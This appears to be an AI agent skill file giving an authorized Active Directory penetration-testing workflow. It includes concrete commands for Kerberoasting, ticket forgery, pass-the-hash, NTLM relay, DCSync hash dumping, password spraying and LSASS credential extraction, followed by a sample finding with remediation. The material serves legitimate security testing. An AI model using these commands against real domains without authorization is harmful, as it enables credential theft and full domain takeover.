---
name: executing-active-directory-attack-simulation
description: >
  Executes authorized attack simulations against Active Directory environments to identify
  misconfigurations, weak credentials, dangerous privilege paths, and exploitable trust
  relationships that could lead to domain compromise. The tester uses BloodHound for attack
  path analysis, Mimikatz for credential extraction, and Impacket for protocol-level attacks
  including Kerberoasting, AS-REP Roasting, and delegation abuse. Activates for requests
  involving Active Directory pentest, AD attack simulation, domain compromise testing,
  or Kerberos attack assessment.
domain: cybersecurity
subdomain: penetration-testing
tags: [Active-Directory, BloodHound, Mimikatz, Kerberoasting, domain-compromise]
version: 1.0.0
author: mahipal
license: Apache-2.0
---
# Executing Active Directory Attack Simulation

## When to Use

- Assessing the security of an Active Directory domain and forest against common and advanced attack techniques
- Identifying attack paths from low-privilege domain user to Domain Admin using privilege relationship analysis
- Validating that Kerberos security configurations, credential policies, and delegation settings resist known attacks
- Testing detection capabilities of the SOC and EDR tools against Active Directory-specific TTPs
- Evaluating the effectiveness of tiered administration models and privileged access workstations

**Do not use** without explicit written authorization from the domain owner, against production domain controllers during business hours unless approved, or for testing that could cause account lockouts affecting real users without prior coordination.

## Prerequisites

- Written authorization specifying the target AD domain, testing constraints, and any off-limits accounts or systems
- Low-privilege domain user account (minimum starting point) to simulate realistic attacker position
- Testing workstation joined to the domain or network access to domain controllers on ports 88, 135, 139, 389, 445, 636, 3268, 3269
- BloodHound Community Edition or Enterprise with SharpHound/AzureHound collectors
- Impacket toolkit, Mimikatz (or pypykatz), Rubeus, and CrackMapExec installed on the attack platform
- Hashcat or John the Ripper with current wordlists (rockyou.txt, SecLists) for offline credential cracking

## Workflow

### Step 1: Active Directory Reconnaissance

Enumerate the AD environment from a low-privilege domain user position:

- **Domain enumeration**: `Get-ADDomain` or `crackmapexec smb <dc_ip> -u <user> -p <pass> --domains` to identify domain name, functional level, domain controllers, and forest trusts
- **User enumeration**: `Get-ADUser -Filter * -Properties ServicePrincipalName,AdminCount,PasswordLastSet` to identify service accounts, privileged accounts, and stale passwords
- **Group enumeration**: Map membership of high-value groups (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators) using `net group "Domain Admins" /domain`
- **GPO enumeration**: `Get-GPO -All | Get-GPOReport -ReportType XML` to identify Group Policy configurations including password policies, audit settings, and software deployment
- **Trust enumeration**: `nltest /domain_trusts /all_trusts` to map inter-domain and inter-forest trusts, noting trust direction and transitivity
- **LDAP queries**: Use `ldapsearch` or ADExplorer to search for accounts with `userAccountControl` flags indicating "password never expires", "password not required", or "DES-only Kerberos"

### Step 2: BloodHound Attack Path Analysis

Collect and analyze AD relationship data to identify the shortest paths to Domain Admin:

- Run SharpHound collector: `SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\temp\` to collect users, groups, sessions, ACLs, trusts, and GPO data
- Import the JSON output into BloodHound and run built-in queries:
  - "Shortest Paths to Domain Admins from Owned Principals"
  - "Find Principals with DCSync Rights"
  - "Find Computers where Domain Users are Local Admin"
  - "Shortest Paths to Unconstrained Delegation Systems"
  - "Find All Paths from Kerberoastable Users"
- Mark the compromised user as "owned" in BloodHound and analyze the resulting attack paths
- Identify ACL-based attack paths: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword on high-value objects
- Document each identified attack path with the chain of relationships and affected objects

### Step 3: Kerberos Attacks

Execute Kerberos-based attacks against identified vulnerable accounts:

- **Kerberoasting**: Request TGS tickets for accounts with SPNs: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile kerberoast.hashes`. Crack offline with `hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt`
- **AS-REP Roasting**: Target accounts without Kerberos pre-authentication: `impacket-GetNPUsers <domain>/ -dc-ip <dc_ip> -usersfile users.txt -format hashcat -outputfile asrep.hashes`. Crack with `hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt`
- **Silver Ticket**: If a service account's NTLM hash is cracked, forge a TGS ticket for that service using `impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> -spn <service/host> <username>`
- **Golden Ticket**: If the krbtgt hash is obtained (post-domain compromise), forge a TGT: `mimikatz "kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<hash> /ticket:golden.kirbi"`
- **Unconstrained Delegation abuse**: Identify computers with unconstrained delegation. Coerce authentication from a Domain Controller using PrinterBug or PetitPotam, then capture the DC's TGT from memory.

### Step 4: Credential Attacks and Lateral Movement

Exploit harvested credentials to move through the domain:

- **Pass-the-Hash**: `impacket-psexec <domain>/<user>@<target> -hashes <LM:NTLM>` to execute commands on systems where the compromised account has local admin
- **Pass-the-Ticket**: `export KRB5CCNAME=ticket.ccache && impacket-psexec <domain>/<user>@<target> -k -no-pass` to use captured or forged Kerberos tickets
- **NTLM Relay**: Configure `impacket-ntlmrelayx -t ldap://<dc_ip> --escalate-user <user>` and coerce authentication to relay NTLM credentials for privilege escalation
- **DCSync**: If DCSync rights are obtained (Replicating Directory Changes): `impacket-secretsdump <domain>/<user>:<pass>@<dc_ip> -just-dc-ntlm` to dump all domain password hashes
- **Password spraying**: `crackmapexec smb <dc_ip> -u users.txt -p 'Winter2025!' --no-bruteforce` testing one password across all accounts to avoid lockouts
- **LSASS dump**: On compromised hosts, extract credentials from LSASS memory using `mimikatz "sekurlsa::logonpasswords"` or `procdump -ma lsass.exe lsass.dmp` followed by offline extraction

### Step 5: Privilege Escalation to Domain Admin

Chain discovered attack paths to escalate from low-privilege user to Domain Admin:

- Follow the shortest path identified in BloodHound by executing each relationship (e.g., GenericWrite on a user -> set SPN -> Kerberoast -> crack password -> user is member of a group with WriteDACL on Domain Admins -> grant self membership)
- Exploit Group Policy Preferences (GPP) passwords if found: `crackmapexec smb <dc_ip> -u <user> -p <pass> -M gpp_autologon`
- Target LAPS (Local Administrator Password Solution) if deployed: query LAPS passwords with `Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd`
- Abuse certificate services (AD CS) with Certipy: `certipy find -vulnerable -u <user>@<domain> -p <pass> -dc-ip <dc_ip>` to find exploitable certificate templates (ESC1-ESC8)
- Document the complete attack chain from initial user to Domain Admin with every credential, tool, and technique used

## Key Concepts

| Term | Definition |
|------|------------|
| **Kerberoasting** | Requesting Kerberos TGS tickets for accounts with Service Principal Names and cracking them offline to recover the service account's plaintext password |
| **AS-REP Roasting** | Requesting Kerberos AS-REP responses for accounts without pre-authentication enabled and cracking the encrypted timestamp offline |
| **DCSync** | Using Directory Replication Service privileges (DS-Replication-Get-Changes-All) to replicate password data from a domain controller, mimicking the behavior of a DC |
| **BloodHound** | Graph-based Active Directory analysis tool that maps privilege relationships and identifies attack paths from any user to high-value targets like Domain Admin |
| **Unconstrained Delegation** | A Kerberos delegation configuration where a service can impersonate any user to any other service, allowing TGT capture from connecting users |
| **Pass-the-Hash** | Authentication technique using an NTLM hash directly instead of the plaintext password, exploiting Windows NTLM authentication |
| **AD CS Abuse** | Exploiting misconfigured Active Directory Certificate Services templates to request certificates that grant elevated privileges or impersonate other users |
| **NTLM Relay** | Forwarding captured NTLM authentication to a different service to authenticate as the victim, effective when SMB signing is not enforced |

## Tools & Systems

- **BloodHound**: Attack path analysis tool that ingests AD data collected by SharpHound to visualize and identify privilege escalation paths through object relationships
- **Impacket**: Python toolkit for network protocol interactions including Kerberos attacks (GetUserSPNs, GetNPUsers), credential dumping (secretsdump), and remote execution (psexec, wmiexec)
- **Mimikatz**: Post-exploitation tool for extracting plaintext credentials, NTLM hashes, and Kerberos tickets from Windows memory (LSASS process)
- **CrackMapExec**: Multi-protocol attack tool for Active Directory environments supporting SMB, LDAP, WinRM, and MSSQL with built-in modules for password spraying and enumeration
- **Certipy**: Python tool for enumerating and exploiting Active Directory Certificate Services (AD CS) misconfigurations

## Common Scenarios

### Scenario: Domain Compromise Assessment for a Healthcare Organization

**Context**: A hospital network with a single Active Directory forest containing 5,000 user accounts, 800 computer objects, and 15 domain controllers across 3 sites. The tester starts with a single low-privilege domain user account. The goal is to determine if an attacker with stolen employee credentials could escalate to Domain Admin.

**Approach**:
1. Run SharpHound to collect AD relationship data and import into BloodHound
2. BloodHound reveals a path: owned user -> member of IT-Support group -> GenericAll on SVC-SQL account -> SVC-SQL has SPN -> Kerberoast -> SVC-SQL is local admin on DB-SERVER-01 -> DB-SERVER-01 has a Domain Admin session
3. Kerberoast SVC-SQL, crack the weak password (Summer2023!) in 12 minutes using hashcat
4. Use SVC-SQL credentials to access DB-SERVER-01 via psexec
5. Extract Domain Admin credentials from LSASS memory on DB-SERVER-01
6. Validate domain compromise by performing DCSync to dump all domain hashes
7. Report the complete attack chain with remediation: set 25+ character passwords on service accounts, enable AES-only Kerberos encryption, remove unnecessary local admin rights, implement tiered administration

**Pitfalls**:
- Running SharpHound with noisy collection methods during peak hours, alerting the SOC via excessive LDAP queries
- Password spraying without checking the domain lockout policy first, locking out hundreds of accounts
- Forgetting to test for AD CS vulnerabilities which often provide the fastest path to Domain Admin
- Not checking for stale computer accounts that may still have cached credentials or active sessions

## Output Format

```
## Finding: Service Account Vulnerable to Kerberoasting with Weak Password

**ID**: AD-002
**Severity**: Critical (CVSS 9.1)
**Affected Object**: SVC-SQL@corp.example.com (Service Account)
**Attack Technique**: MITRE ATT&CK T1558.003 - Kerberoasting

**Description**:
The service account SVC-SQL has a Service Principal Name (MSSQLSvc/db-server-01.corp.example.com:1433)
registered in Active Directory and uses a weak password that was cracked in 12 minutes
using hashcat with the rockyou.txt wordlist. This account has local administrator
privileges on DB-SERVER-01, which had an active Domain Admin session at the time of
testing.

**Attack Chain**:
1. Requested TGS ticket: impacket-GetUserSPNs corp.example.com/testuser:password -request
2. Cracked hash: hashcat -m 13100 hash.txt rockyou.txt (cracked in 12m: Summer2023!)
3. Lateral movement: impacket-psexec corp.example.com/SVC-SQL:Summer2023!@db-server-01
4. Credential extraction: mimikatz sekurlsa::logonpasswords -> Domain Admin NTLM hash

**Impact**:
Complete domain compromise from a single low-privilege domain user account. An attacker
could access all 5,000 user accounts, 800 computer objects, and all data within the domain.

**Remediation**:
1. Set a 25+ character randomly generated password for SVC-SQL and all service accounts
2. Migrate to Group Managed Service Accounts (gMSA) which rotate 120-character passwords automatically
3. Enable AES256 encryption for Kerberos and disable RC4 (DES) encryption
4. Remove SVC-SQL from local administrator groups on DB-SERVER-01
5. Implement Protected Users group for privileged accounts to prevent credential caching
6. Deploy Microsoft Defender for Identity to detect Kerberoasting and DCSync attacks
```
